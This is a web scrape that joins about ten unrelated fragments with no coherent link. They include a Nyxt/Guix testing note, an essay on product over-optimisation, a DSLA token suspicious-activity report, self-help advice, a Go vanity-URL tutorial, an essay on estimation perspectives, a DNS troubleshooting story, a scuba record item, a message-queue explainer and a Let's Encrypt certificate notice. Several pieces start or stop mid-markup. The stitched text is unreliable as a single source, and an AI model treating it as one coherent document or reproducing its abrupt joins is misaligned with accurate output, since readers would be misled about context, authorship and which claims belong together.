<p>We have a <a href="https://github.com/atlas-engineer/nyxt/blob/2-pre-release-4/build-scripts/guix.scm">Guix recipe</a> to build Nyxt using the <a href="https://guix.gnu.org/">Guix</a> package manager. There are many benefits in providing a Guix package, among others it allows us to provide a create a <a href="https://guix.gnu.org/en/blog/2018/tarballs-the-ultimate-container-image-format/">Guix pack</a> which is an self-containing, portable tarball that can be unpacked and run on any operating system with a Linux kernel.</p>
<p>Another benefit of packaging for Guix is that it uses its own Common Lisp packages instead of Quicklisp to manage the Common Lisp dependencies. This validates our quality assurance one step further.</p></li>
<li><p>Code coverage</p>
<p>SBCL supports coverage reporting thanks to its <code>sb-cover</code> extension. We hope to make use of it to provide the most exhaustive test suite possible.</p></li>
</ul>

[1]</p><p>But optimize long enough and everything becomes the equivalent of BuzzFeed or porn.</p><p>Clickbait, sex, drama, and superficialness. Being everything to everyone and nothing to no one.</p><p>Groupon’s quality went down the drain because Mason’s employees told him sending more emails per day increased revenue.</p><p>The deals became ever lower in quality and users got annoyed.</p><p>There was a time where people<strong> could not wait</strong> to get an email from Groupon. They had killer deals. They had hilarious copywriters. Even if you didn’t buy, getting an email was a treat. But now that it has been properly sterilized to please spineless, risk-averse shareholders, and optimized for maximum quarterly revenue, can you think of a single person that feels that way anymore? Not one person? Groupon clearly has lost its soul, its essence. Mason said in an interview (can’t recall the source) that he wondered if Groupon was meant to be an extraordinary company, just for a smaller market. It certainly would have made it easier to build the company according to his vision rather than something that needed to please the shareholders that needed an IPO to get a return.</p><p>In the early days you had the GOATS like Reid Hoffman (founder LinkedIn), Max Levchin (Paypal and Affirm), and the likes answering questions. Now it’s some 14yr old telling you about the opportunity of a lifetime: screencasting stories from Reddit, having the speech to text tool read them, turn it into a video and put it on YouTube. And then…? Millions I guess?</p><p>It went from THE place to get high-quality courses from knowledgeable instructors to the flea-market of cheap knock-offs and fake guru business opportunity courses. While you can find quality courses there, the overall quality has badly degraded. The best instructors aren’t incentivized to create a course because your $1000 course containing 3 decades of experience will sell for $9.99 of which you’ll get $2.50. So if you actually have something to offer, you’ll go somewhere else, leaving mainly the type of people that game the system in order to make a quick buck.</p><p>People used to LOVE Facebook with a vengeance. Now I have 80 notifications, 40 of which are new friend suggestions of people I’ve never met, 20 are strangers that sent out a blast to get likes for their new page, 17 are events, and 3 are birthdays. [2]</p><p>Oh yeah… and not 1 is actually relevant to me.&nbsp;You can fool a user only so many times before you’ve essentially trained them to ignore you.</p><p><em>They started implementing the same dark patterns with their DM. You get notifications for being friends for a certain time and when you accept a new friend.</em></p><p>In its search for endless optimization, the platform has become bloated and just plain annoying. I can’t think of a single person in my cohort (and younger cohorts) that use FB as much or more as 10 years ago.&nbsp;</p><p>The current demographic appears to be the same type of people that use Bing over Google, or Explorer over Chrome. Late adopters that are sticky to defaults.</p><p>So be careful when optimizing. Remember the quantification bias! </p><p><em>Discussed in </em><a href="https://www.younglingfeynman.com/essays/paradigm"><em>Paradigm Shift: Drastically Increase The Odds of Success</em></a></p><p>Just because something is easy to measure doesn’t mean it’s insightful. Just because something can’t be measured easily doesn’t mean it isn’t.</p><p>Remember that business is part art part science: <a href="https://www.younglingfeynman.com/essays/artofbusiness" target="_blank">The Art Of Business, Where Science And Business Depart</a>.</p><p>[1]  I <a href="https://www.younglingfeynman.com/essays/comedy">made the point before</a> when it comes to certain areas that are sufficiently complex (e.g. statistics, data science, economics), you either want no one or a person with extraordinarily deep expertise. </p><p>Interesting piece on the fraud that’s going on in Data Science: <a href="https://logicmag.io/intelligence/interview-with-an-anonymous-data-scientist/"><em>The Smart, the Stupid, and the Catastrophically Scary: An Interview with an Anonymous Data Scientist</em></a></p><p>What you don’t want is someone that knows enough to bullshit you but not enough to get it right. An indicator that you might have the right person is the phrase: ‘‘I’m not sure’’ or ‘‘ it depends on…’’. In these fields, the vast majority of so-called experts add no value at best or negative value at worst.</p><p>[2] This is what I admired so much about Systrom’s and Krieger’s Instagram. Their almost zen-like essentialism. No bloating, no fluff, trying very hard to take away things as they did about adding things. How many new features did they launch in a month before their Facebook acquisition? How many new features does IG launch now per month? </p><p>I’m not saying adding new features is bad. I’m also not saying that a company shouldn’t scale. The point I’m making is that entropy is real. It’s much easier for your product to become worse, than it is to become better. So if that’s not a core focus, it probably won’t happen by accident.</p><p>But scale and improvements in user love (which follow from a better service/product) are not mutually exclusive. Apple provides a data point.

<p><em>The purpose of this Suspicion Activity Report (SAR) is to disclose the existence of transactions that do not make sense to our team, as well as introduce an emergency plan to mitigate their impact on the <a href="https://etherscan.io/token/0x3affcca64c2a6f4e3b6bd9c64cd2c969efd1ecbe">DSLA Token</a>, and the rest of the DSLA family of products.</em></p>

<h3 id="-november-13-2020">📅 November 13, 2020</h3>

<p>It was brought to our attention that large amounts of DSLA tokens originating from the ProBit <a href="https://etherscan.io/token/0x3affcca64c2a6f4e3b6bd9c64cd2c969efd1ecbe?a=0x72e5263ff33d2494692d7f94a758aa9f82062f73">liquidity pool</a> have been sold on Uniswap, in highly automated ways.</p>

<h3 id="--november-14-2020">📅  November 14, 2020</h3>

<p>Per our initial investigation, it is indeed unlikely that a human trader would <a href="https://etherscan.io/tx/0xa63248a6a421a25d969c3835b6c0ad3afa934885152e8646bd2fddae022eaa8a">withdraw DSLA tokens from ProBit</a>, then <a href="https://etherscan.io/tx/0xd27a16d359c58b589b5805b39b41e09f2ee61446d8a32159203696cb3ce83859">swap DSLA tokens for USDT on Uniswap</a>, in such a short amount of time (2 minutes), and on <a href="https://etherscan.io/token/0x3affcca64c2a6f4e3b6bd9c64cd2c969efd1ecbe?a=0xc9cae208c7a00b000bbb4bd0645dd170623e9526">repeated, systematic occasions</a>.</p>

<h3 id="️-intermediate-conclusion">⚠️ Intermediate conclusion</h3>

<p>Burried in otherwise valid transactions, the <code>0xc9cae208c7a00b000bbb4bd0645dd170623e9526</code> wallet involved in these swaps is <strong>either exerting price manipulation, or turning a profit through aggressive arbitrage</strong>.</p>

<p>We have reached to the ProBit team for clarification, as we lack the elements to clearly establish responsibilities at this stage.</p>

<hr>

<h2 id="mitigation-plan">Mitigation Plan</h2>

<p>There is no reliable model for quantifying the impact of programmatic sell-offs on the price of assets and their market capitalization.</p>

<p>But we can still harden DSLA against suppression, manipulation, and trading abuse, by:</p>

<ul>
  <li><strong>A)</strong> Recapturing lost value by reducing DSLA’s total supply;</li>
  <li><strong>B)</strong> Parting ways with our centralized cryptocurrency exchanges;</li>
  <li><strong>C)</strong> Adding liquidity and creating new LP incentives across all DEX pools.</li>
</ul>

<h3 id="a--2b-dsla-token-burn">A) 🔥 2B+ DSLA Token Burn</h3>

<p>On November 30, 2020, we will proceed with a <strong>2,000,000,000.00 DSLA token burn</strong> using our personal, team, company and participating partners wallets. All other DSLA holders will benefit from the increase in scarcity / decrease in total supply of DSLA.</p>

<p>In that same spirit, we will also inaugurate a new section on the <a href="https://stacktical.com/">DSLA Protocol official website</a>, dedicated to:</p>

<ul>
  <li>The tracking of your DSLA holdings;</li>
  <li>The updated DSLA token distribution and the detailed purpose of company wallets;</li>
  <li>The monitoring of DSLA transactions.</li>
</ul>

<p>These information also aim at increasing the overall auditability of the project, in preparation for our mainnet launch.</p>

<h3 id="b--trusted-trading-platforms">B) 🤝 Trusted Trading Platforms</h3>

<p><strong>As we are figuring out the ins and outs of the sell-off with the ProBit team, we strongly advise you do not deposit any funds to the exchange, and consider withdrawing your funds as soon as possible.</strong> Here is a list of more reliable, decentralized options:</p>

                    <h2>Feeling great</h2>
<p>What do you want people to feel when they talk to you? Happiness, sadness or maybe everything combined? </p>
<p>Do you want people to be inspired or motivated to tackle new and exiting problems? </p>
<p>Do you want to make the world a better place?</p>
<p>I think to understand your life purpose, you gotta understand yourself first. Not in a psychoanalytical way, but in a spiritual and reflectional way.</p>
<p>Don’t beat yourself up. Make yourself proud inside of you. If you are proud of what you do, then it means that you are following your heart. If you are following your heart, you are doing the best work you can, because there are too many people that do things for money. If you want to succeed, then there is no better strategy than that.</p>
<p>Live the life that you would feel proud about telling your grandchildren. Live the life that would inspire your children and will set a good role model for them. Be a person that is open to every opportunity, but chooses only those that align with their goals. Be open to success and closed for disappointment.</p>
<p>Shoot each time you have an idea, and don’t afraid to fail. You can miss and embers yourself just a little. Or you can never shoot and never achieve anything in life. Which one sounds worse?</p>
<h2>Understand your surrounding</h2>
<p>The most important part of being successful is in alignment with your surrounding.</p>
<p>Look around yourself. Do your habits improve it? Do people around you improve and getter better because of your actions? Are you on your way to helping others?</p>
<p>Humans are social beings, and the language that we have developed is the biggest indicator of that. If we could survive alone, we wouldn’t have needed a language to communicate. </p>
<p>You need to check up on others and help them. This will cause a domino effect, and in the end, you will benefit even more from that.</p>
<p>You are 5 people who you spend most of your time with. List those people and check if they are improving you and your well being, or are they destroying it? It is essential to make those 5 people stronger and better than you. This will allow you to grow, which will allow you that effect to trickle to other people, improving their lives.</p>
<h2>Don’t be afraid to try</h2>
<p>If you have a particular thing that you want to experiment, calculate how much will it cost. Mostly the things we are the most afraid of trying or doing we can try or do for less than $500 and the drawbacks are not irreversible.</p>
<p>Don’t be afraid to shoot and fail. Try and see how it goes. You can always roll back to the point of start.</p>
<p>Start now. Get perfect later.</p>

            <p>This post is about how I renamed a go module from
github.com/something/somethingelse to go.gianarb.it/somethingelse. It requires
zero infrastructure, just a static site that can run on GitHub.</p>

<p>I used one of the many projects I have that nobody cares about
<a href="https://github.com/gianarb/go-irc">gianarb/go-irc</a>.</p>

<h3 id="why">Why</h3>

<p>You know, is one of those ideas you have in your mind for ages, but who cares?
At least for me that I don’t have any cool open source project under my name.</p>

<p>I am not one of those people who suffer when realizing that it is not escale. If
you end up having a project that gets traction and is tight to github.com
because you didn’t think about another way to go, you are stuck. And even if
GitHub today is cool, it won’t stay cool forever.</p>

<p>Filippo Valsorda <a href="https://twitter.com/FiloSottile">@FiloSottile</a> today
<a href="https://twitter.com/FiloSottile/status/1327240411266641920">tweeted</a> about this
topic, and I looked at how he set up filippo.io/age to solve this little
dilemma.</p>

<h3 id="goals">Goals</h3>

<p>This is not about how to escape from GitHub but is about setting up a “vanity
URL” that won’t lock you or your project to GitHub. It does not require any
infrastructure, just a domain that you can point to a GitHub Pages.</p>

<h3 id="prerequisite">Prerequisite</h3>

<ol>
  <li>Create a DNS record that points as CNAME to <code>&lt;github-handle&gt;.github.io</code>. I
used go.gianarb.it</li>
  <li>Create a repository; it will be the home for your static site. Mine is
<a href="https://github.com/gianarb/go-libraries">gianarb/go-libraries</a></li>
  <li>Set the repository up to be a <a href="https://pages.github.com/">GitHub page</a> and
enable HTTPS. You can enable it via the repository Settings; we will push
HTML files to it directly, so I used the master branch as the GitHub page’s
source.</li>
</ol>

<h3 id="add-your-first-library">Add your first library.</h3>

<p>If your library is already using go mod, you have to change the module name to
the new one. In my case, from was github.com/gianarb/go-irc to
go.gianarb.it/irc. I just searched and replaced with my editor in all the
project. Renaming a module is a bc break; I am not sure how to avoid or mitigate
that; if you know, let me know!</p>

<p>You can push a new file to your static site repository; I called my irc:</p>

<div><div><pre><code><span>&lt;html&gt;</span>
    <span>&lt;head&gt;</span>
        <span>&lt;meta</span> <span>name=</span><span>"go-import"</span> <span>content=</span><span>"go.gianarb.it/irc git https://github.com/gianarb/go-irc"</span><span>&gt;</span>
        <span>&lt;meta</span> <span>http-equiv=</span><span>"refresh"</span> <span>content=</span><span>"0;URL='https://github.com/gianarb/go-irc'"</span><span>&gt;</span>
    <span>&lt;/head&gt;</span>
    <span>&lt;body&gt;</span>
        Redirecting you to the <span>&lt;a</span> <span>href=</span><span>"https://github.com/gianarb/go-irc"</span><span>&gt;</span>project page<span>&lt;/a&gt;</span>...
    <span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span>
</code></pre></div></div>

<p>Replace your URL accordingly, but as soon as you push this file and GitHub will
release it to your page, you will be able to import: <code>go.gianarb.it/irc</code>.</p>

<h3 id="conclusion">Conclusion</h3>

<p>This methods works as a safeguard if you decide to move your code out from
GitHub. The static site can be deployed to Netlify, S3 or served by Nginx. It
does not need to stay on GitHub.</p>

<p>Same for your code, if you decide to move from GitHub to GitLab you can do it
transparently.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Consider a team of engineers building a feature API for Snapchat. Let’s call them Ovah’s team. They’re facing two big problems: how to build it, and how long would it take.</p>

<p>If they can’t figure out how to build it, the feature is dead already. If they take too long to build it, the feature is as good as dead: Instagram would copy it before they’ve built it.</p>

<p>This post contains 4 different perspectives to look at the two problems. As you read through the perspectives, notice the tension in the examples. Both problems are vastly different, and some perspectives are better for one problem, and worse for another problem.</p>





<h2 id="the-outside-view">The Outside View</h2>

<figure>
    
    <img src="https://neilkakkar.com/assets/images/different_perspectives_outside.jpg" alt="">
    
    
    
</figure>

<p>To take the outside view, Ovah’s team compares this feature to other similar features they’ve built in the past. They built earlier features using Flask, and it took them 1 month to do it.</p>

<p>The outside view says that a good estimate for how long it would take is 1 month as well.</p>

<p>Further, the outside view says that a good estimate for how to build it is how you built it in the past: using Flask.<sup id="fnref:1"><a href="#fn:1">1</a></sup></p>

<p>The outside view looks for similar problems in different contexts. It’s a <a href="https://www.lesswrong.com/posts/gvK5QWRLk3H8iqcNy/gears-vs-behavior" target="_blank" rel="noopener">behaviour level model</a>: you look at things only from the outside. How things change from the outside are hints to what’s important on the inside.</p>

<p>You’ll notice that figuring out how long it takes might do well with the outside view, but the API design decisions - not so much. What’s different between the two problems?</p>

<p>Taking the outside view on API design decisions is like building a truck using a car model. Just because it has 4 wheels and behaves the same as a car doesn’t mean it’s used for the same purposes.</p>

<p>On the flip side, not taking the outside view for figuring out how long it would take is a fallacy. Daniel Kahneman writes about the outside view in <a href="https://amzn.to/3eVmTkk" target="_blank" rel="noopener">Thinking, Fast and Slow</a><sup id="fnref:3"><a href="#fn:3">2</a></sup>:</p>

<blockquote>
  <p>“People who have information about an individual case rarely feel the need to know the statistics of the class to which the case belongs”</p>
</blockquote>

<h2 id="the-inside-view">The Inside View</h2>

<figure>
    
    <img src="https://neilkakkar.com/assets/images/different_perspectives_inside.jpg" alt="">
    
    
    
</figure>

<p>To take the inside view, Ovah’s team looks at the components of the problem. They look at the requirements for the feature, and come up with a good design tailored exactly for this use case. It’s unique. They decide to go with Django instead of Flask, since it gets them authentication and other nice things out of the box.</p>

<p>The team figures that with Django, most things are done for them already, so it should take about 2 weeks.</p>

<p>The inside view looks at specifics of the problem. It’s a gears level model: you understand how things tick. You figure out how each component would work.</p>

<p>Taking both, the inside and outside view is better than just taking one. It’s like going to the eye doctor, where they show you unreadable letters on a lit-up screen. They add one lens on your eyes, and you begin to distinguish <code>o</code> and <code>e</code>. Then they add a second lens, and now you can even tell the difference between <code>h</code> and <code>n</code>! They add a third spherical lens, and the dots become sharper - you can now even see the dots over the i’s as circles, not blobs. Each lens is a perspective that sharpens your view. It helps you realise that you’re looking at <strong>e</strong>va<strong>n</strong>’s team, not <strong>o</strong>va<strong>h</strong>’s team: and then everything clicks.</p>

<figure>
    
    <img src="https://neilkakkar.com/assets/images/divider.jpg" alt="">
    
    
    
</figure>

<p>In this case, using Django was a good decision. However, it took much longer than 2 weeks: unexpected things went wrong, and the team’s imagination was limited by how things can go right.</p>

<p>I think engineers are better at designing APIs than they are at figuring out how long it would take, which hints at them being better at taking the Inside View. This makes taking the Outside View even more important: if no one else is thinking like you, you have a sharp lens no one else has, which makes all the difference.</p>

<p>At the same time, you need to beware of <a href="https://en.wikipedia.org/wiki/Law_of_the_instrument" target="_blank" rel="noopener">Maslow’s Hammer</a>: If you only take the Outside View on every problem, you’ll end up with a bad API design.</p>

<h2 id="the-birds-eye-view">The Bird’s eye View</h2>

<figure>
    
    <img src="https://neilkakkar.com/assets/images/different_perspectives_bird.jpg" alt="">
    
    
    
</figure>

<p>To take the bird’s eye view, Evan’s team looks at how this API should connect to other teams and clients. What are the other components involved? How can we best design things to work seamlessly with existing workflows?</p>

<p>The bird’s eye view looks at the problem as a part of a system, a part of other problems. This is different from the outside view, since it’s still the same problem in the same setting, but being looked at as an interface: how it connects to other things and other problems.</p>

<!-- Sometimes, tweaking the bigger picture can improve the interface, and subsequently the problem in the specific box you were working. -->

<p>Amazon is a company that internalises the bird’s eye view: Every team talks via interfaces! Every other team is their customer. You can’t go to your friend and ask them to open a backdoor for internal calls: it needs to be part of an interface anyone in the company can call. This means, not just clients, but also their colleagues and friends face the pain when the interfaces are hard to use.</p>

<p>What would it mean to take the bird’s eye view for the second problem? Evan’s team looks at how long their dependent teams would take, and when customers would be most likely to upgrade. So, they decide to launch with the next filters release, using that as a guiding factor: if the feature won’t get done by this time, build a smaller feature.</p>

<h2 id="the-worms-eye-view---genchi-genbutsu">The worm’s eye View - Genchi Genbutsu</h2>

<figure>
    
    <img src="https://neilkakkar.com/assets/images/different_perspectives_worm.jpg" alt="">
    
    
    
</figure>

<p><a href="https://en.wikipedia.org/wiki/Genchi_Genbutsu" target="_blank" rel="noopener">Genchi Genbutsu</a> means to “go and see”. Go to the problem, and see why it’s a problem.<sup id="fnref:4"><a href="#fn:4">3</a></sup></p>

<p>For Evan’s team, this means looking at the team dynamics, and figuring out if Evan or others are somehow holding the team back. It also means figuring out if they have the required expertise in the team, and if not, how can they build it.</p>

<p>Like how the bird’s eye view zooms out to the interface between other teams, the worm’s eye view zooms in to the interface between people in the team. It’s one layer deeper than the problem of designing the API: it’s about how the team will go about it. You’re looking at the problem as a single engineer among other engineers working on the same problem.</p>

<figure>
    
    <img src="https://neilkakkar.com/assets/images/divider.jpg" alt="">
    
    
    
</figure>

<p>I’ve noticed that the Inside View, and the Bird’s eye view comes more naturally to people, while Genchi Genbutsu and the Outside View are rarer. The more uncertainty and unknown unknowns involved in a problem, the more important Genchi Genbutsu and the Outside View become.</p>

<p>The importance of taking these different perspectives shows up when you’re facing hard problems without an obvious solution: with the right combination of lenses, a blur turns into a sharp dot.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
				<p>Brought to you by the “I hate Mondays” department of Tales Of A Tech.</p>
<p>We would like to remind you that if there is a problem and you can’t seem to figure it out there’s always one solution to look to: It’s ALWAYS DNS.</p>

<p><strong>The Story:</strong></p>
<p>Last night I was trying to login to this site in order to make a post about my drone shenanigans (which, by the way, is <a href="https://talesofatech.com/2017/03/drone-shenanigans/">here</a>). &nbsp;I was already super frustrated because Mass Effect: Andromeda is coded by a team of (apparently) monkeys who don’t understand how to make working autosave features (my autosave files are all corrupt, causing me to lose 5+ hours of gameplay) and the site wasn’t being cooperative. &nbsp;I was reaching “blow-your-top” levels of frustration. &nbsp;I was finally able to connect and login but I immediately noticed things were running VERY slowly. &nbsp;It was weird, and I couldn’t figure out why. EVERYTHING seemed slow. &nbsp;Even the SSH connection was jittery and laggy.</p>
<p>At first I thought it was a problem with the network in the apartment. &nbsp;It happens from time to time. &nbsp;We run a lot of equipment in our apartment. &nbsp;I ran some speed tests and some other diagnostics and found that everything seemed to be working. &nbsp;Very weird.</p>
<p>Since I managed to SSH in I decided to check some logs. &nbsp;There didn’t seem to be anything in the apache log. &nbsp;fail2ban wasn’t being uncooperative. MySQL was running and seemingly accepting localhost connections. &nbsp;Very weird. &nbsp;I resorted to the only thing I could think of next: I rebooted the box.</p>
<p>Everything&nbsp;came back up (yay) but the site was still clunky and slow (not so yay).</p>
<p>I decided to enable verbose logging in apache and attempt to restart the service. &nbsp;It timed out. The hell?</p>
<p>I ran “journalctl -xe” per service failure message and noticed a peculiar entry:</p>
<pre>Mar 27 21:17:51 TalesOfAnAdmin systemd[1]: apache2.service: Start operation timed out. Terminating.
Mar 27 21:17:51 TalesOfAnAdmin systemd[1]: Failed to start The Apache HTTP Server.</pre>
<p>Failed to start due to timeout? &nbsp;Timeout of what? SO CONFUSED.</p>
<p>Digging back a little further I saw another confusing line:</p>
<pre>Mar 27 21:15:12 TalesOfAnAdmin apachectl[1860]: [Mon Mar 27 21:15:12.835322 2017] [core:error] [pid 1864] (EAI 2)Name or service not known: AH00547: Could not resolve host name maplerangers.com</pre>
<p>Huh. &nbsp;Weird.</p>
<p>I had a quick confab with Nick and he suggested I check if my websites were in my hostfile. &nbsp;They weren’t, so I added them. &nbsp;Apache startup became instantaneous. &nbsp;Things seemed to be improving. &nbsp;Cool.</p>
<p>I logged in to the website which was up and more responsive, but absolutely slow. &nbsp;Very weird still. &nbsp;I noticed an error on my WordPress Administration page: “curl error 28: operation timed out”</p>
<p>What the hell?</p>
<p>So back to the SSH I go. &nbsp;I try pinging wordpress.com: &nbsp;Unknown host. &nbsp;I try pinging google.com: Unknown host. &nbsp;I try pinging an IP Address for those sites: Working fine.</p>
<p>Grrrr!</p>
<p>I look at /etc/resolv.conf — I’m using Google DNS. &nbsp;Ok.</p>

<p>An Egyptian scuba diver is believed to have set a new world record by remaining under water for nearly six entire days.</p>
<p>Saddam Al-Kilany, 29,&nbsp;completed the feat in the&nbsp;Red Sea off the Dahab coast.</p>
<p>Al-Kilany stayed underwater for 145 hours and 30 minutes, surpassing the current record&nbsp;of 142 hours, 47 minutes. The current world record was set by Cem Karabay in Cyprus.</p>
<p>Al-Kilany had&nbsp;originally planned to remain&nbsp;underwater for 150 hours, but the attempt was ended at 145 hours and 30 minutes due to concerns about his health.</p>
<p>Al-Kilany, who previously made headlines when he and his fiancee, Pia Legora, held their&nbsp;engagement ceremony&nbsp;underwater in September.</p>
<p>Video from the attempt and other documentation is being submitted to&nbsp;Guinness World Records&nbsp;for recognition.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>Message queues are one of the critical components in any software architecture which helps different components talk to each other asynchronously. In this article let's discuss what message queues are, how they're used in modern architectures and what problems do they solve.</p>
<p>Let's say you want to withdraw some money from an ATM. An ATM machine can only allow one person to do transactions at a time. In this case, what do you do when you see there's a person already using the ATM machine? Do you wait in a queue or do you go back thinking you cannot withdraw money from this machine?</p>
<p>Exactly! You wait in a queue until your turn comes.</p>
<p>So when many people want to withdraw money they will have to wait in a queue and go to the ATM machine in the same order in which they entered the queue. This is one real world example of queues and message queues serve the same purpose in any software architecture.</p>
<p>We will talk about below topics in this article:</p>
<ul>
<li><a href="#what-are">What are message queues?</a></li>
<li><a href="#used-how">How are message queues used in a system?</a></li>
<li><a href="#problems">What problems do message queues solve?</a></li>
<li><a href="#properties">Other properties of message queues</a></li>
<li><a href="#resources">Resources</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>

<h3 id="what-are-message-queues">What Are Message Queues?</h3>
<p>A queue is a First-In First-Out data structure. If you have a computer science background you know how a queue data structure works: the first element pushed into the queue is the first item extracted. It's basically the same concept as what we discussed in our ATM machine example.</p>
<p>A message queue is basically a queuing service used in micro services &amp; server-less architectures to decouple different components that are easier to develop, scale &amp; maintain in the long term. Message queues helps different components to communicate asynchronously by passing messages between them.</p>
<p>Generally in applications where message queues are used there are producers who create and put the messages into message queues. And there are consumers or worker processes which read those messages and take actions.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605504976290/uqTaa9q5A.png?auto=format&amp;q=60" alt="imageedit_2_4624157258.png"></p>
<p>A message is any data that is passed between two components. It contains all the information needed for the worker components to take actions.</p>
<p>Let's consider a use case where we have to recharge a customer's account. The worker component need to know these details: account_id, card_id, amount (in dollars).</p>
<p>The message the producer creates and puts into a message queues will look something like this:</p>
<pre><code>{
    <span>"account_id"</span>: <span>12345</span>,
    <span>"card_id"</span>: <span>567</span>,
    <span>"amount"</span>: <span>100</span>
}
</code></pre><p>As you can see, the above message contains all the information that a worker process needs to recharge this customer's account.</p>
<p>There are many third party message queueing services like Rabbit MQ, Kafka, Amazon SQS to name a few. Each one of them provide different features suitable for different use cases.</p>

<h3 id="how-are-message-queues-used-in-a-system">How Are Message Queues Used In A System?</h3>
<p>As mentioned earlier message queues are used to decouple different components in a system. But what does it mean to decouple a system? It basically means the process of separating functions so that they're more independent and self contained.</p>
<p>Let's discuss it with an example. Let's say we need an application to generate invoices and send it to our customers at the end of the month. For the sake of this discussion let's assume that generating invoices is a time taking process and take anywhere between few seconds to a minute to generate one single invoice which involves doing the below steps in order:</p>
<ul>
<li>Get customer account details</li>
<li>Get customer billing details</li>
<li>Get data for different products used by the customer during the month</li>
<li>Apply any onetime charges and charge customers</li>
<li>Finally generate a invoice PDF and send it to the customer</li>
</ul>
<p>How would you implement such a functionality?</p>
<p>This is how a naive developer would approach it: Build a single REST service which accepts requests and does the above steps. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605506280058/Y03xhpEYG.png?auto=format&amp;q=60" alt="imageedit_2_8235631782.png"></p>
<p>This is a monolith architecture and has many problems with it:</p>
<ul>
<li><p><strong>No Fault Tolerance:</strong> Fault tolerance is the ability for a system to continue operating without any interruption when one or more of its components fail. Since we have a single REST service, if the service goes down, the whole application stops working.</p>
</li>
<li><p><strong>Components Cannot Be Scaled Independently:</strong> If we want to scale the application when the number of customers accounts increase, then we have to scale the whole application. This means more resources will be used since we cannot scale any individual component independently. So the use cases like Get Account Details will be scaled even though it is unnecessary because this components generally gets less traffic.</p>
</li>
<li><p><strong>No Freedom of Language:</strong> Since all the components are built using a single application, a single language / framework need to be used to build the complete application. We cannot use different languages for different components since the whole application is a single code repository which is built and deployed together.</p>
</li>
<li><p><strong>Increase in Development and Deployment Time:</strong> Having all the components as one single codebase will increase the development time. Since this is a big application, it's possible that different teams would be working on different components of the system at any point in time. So all the teams need to take care of code consistency, code quality and also have to spend time in resolving merge conflicts since active development will be going on. This adds to the development time. Also with bigger codebase it takes more time to build and deploy.</p>
</li>
</ul>
<p>As seen above there are many problems if we go with a monolith architecture for the given problem statement. We need to divide the application into multiple components like Invoice Generation Service, Invoice Generation Service Worker, Account Service, PDF Generation Service etc.</p>
<p>Let's see how diving this into multiple services &amp; having a message queue to communicate between them will solve these problems.</p>

<h3 id="what-problems-do-message-queues-solve">What Problems Do Message Queues Solve?</h3>
<p>With micro services architecture, the architecture would look something like this:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605508126047/PhUZ4K-mV.png?auto=format&amp;q=60" alt="imageedit_2_2135728654.png"></p>
<p>In this architecture the Invoice Generation Service will create a message for every customer account. This message would look something like this:</p>
<pre><code>{
    <span>"account_id"</span>: <span>12345</span>,
    <span>"invoice_start_date"</span>: <span>"2020-10-01"</span>,
    <span>"invoice_end_date"</span>: <span>"2020-10-31"</span>
}
</code></pre><p>Therefore if we have 1000 accounts there will be 1000 messages pushed into the queue. The worker service will contain multiple workers. Each worker will pickup a message and start processing it. All the workers will be running concurrently. Each of these workers will talk to Account Service, Billing Service and PDF Generation Services which are micro services themselves.</p>
<p>Now let's see how each of the problems mentioned above will be solved with this architecture.</p>
<ul>
<li><p><strong> Fault Tolerance</strong>: If one of the component fails the other will work seamlessly. Let's say if Invoice Generation Service Worker is down for reasons, Invoice Generation Service will continue to work and keep pushing messages into the queue. It is not dependent on whether Worker service is up or not. If Invoice Generation Service is down, Worker service will continue to pull the messages from the queue and continue to generate invoices. So now there is fault tolerance in the system.</p>
</li>
<li><p><strong>Scalability:</strong> Now since the components are independent of one another they can be scaled independently too. All the heavy weight work is being done by the Worker service and Invoice Generation Service is just creating and pushing the messages into the message queue. So we need more computing power for the Worker service. So we can have powerful machines to run Worker service and we can add more tasks if the number of accounts increase in the future. Whereas the Invoice Generation Service can be run on less powerful machines. With this architecture we're able to scale the different components independently.</p>
</li>
<li><p><strong>Freedom of Language:</strong> Having multiple components like this will give us the freedom to implement different components in different programming languages and frameworks. For example: Invoice Generation Service can be implemented in Java. Worker can be implemented in GoLang.
And if let's say we have another service which is responsible for generating invoice pdf, this can be implemented in Python. So having multiple components like this and having a message queue for communication between them will give us the flexibility over languages used in the architecture.</p>
</li>
<li><p><strong>Improved Developer Productivity &amp; Deployment Time:</strong> Since different components can be developed independently, the developer productivity will increase since they don't have to spend more time in co-ordinating when adding new features, resolving merge conflicts etc. Also the codebase of each of the component or service will be lighter and will have a separate deployment pipeline. So the quality, build and deployment time will decrease.</p>
</li>
</ul>

<h3 id="other-properties-of-message-queues">Other Properties Of Message Queues</h3>
<p>Different message queuing services offer different message queues with properties like visibility timeout, message retention period, message size etc based on the popular use cases in the industry.</p>
<p>AWS provided message queuing service is called SQS (Simple Queue Service).</p>
<p>Let's discuss about SQS provided message queues and their properties in this section which gives you an idea on the different types of properties available with message queues in general.</p>
<p>AWS SQS offers two types of message queues:</p>
<h4 id="standard-queue">Standard Queue:</h4>
<p>Amazon SQS offers standard as the default queue type. Standard queues support a nearly unlimited number of API calls per second, per API action (SendMessage, ReceiveMessage, or DeleteMessage). Standard queues support at-least-once message delivery. However, occasionally (because of the highly distributed architecture that allows nearly unlimited throughput), more than one copy of a message might be delivered out of order. Standard queues provide best-effort ordering which ensures that messages are generally delivered in the same order as they're sent.</p>
<h4 id="fifo-queue">FIFO Queue:</h4>
<p>FIFO (First-In-First-Out) queues are designed to enhance messaging between applications when the order of operations and events is critical, …</p></div></div>

<p>Starting January 21, 2021 and ending September 1, 2021, sites using TLS/SSL certificates issued by <a href="https://www.abetterinternet.org/">ISRG</a>‘s <a href="https://letsencrypt.org/">Let’s Encrypt</a> service <a href="https://letsencrypt.org/2020/11/06/own-two-feet.html">will be transitioning to a certificate chain based on the ISRG Root X1 certificate</a> instead of <a href="https://www.identrust.com/">IdenTrust</a>‘s DST Root X3. After the DST Root X3 certificate expiry on September 30, 2021, it will no longer be usable to bootstrap ISRG in legacy trusted root certificate stores.</p>
<p>This affects Android prior to 7.1.1.</p>
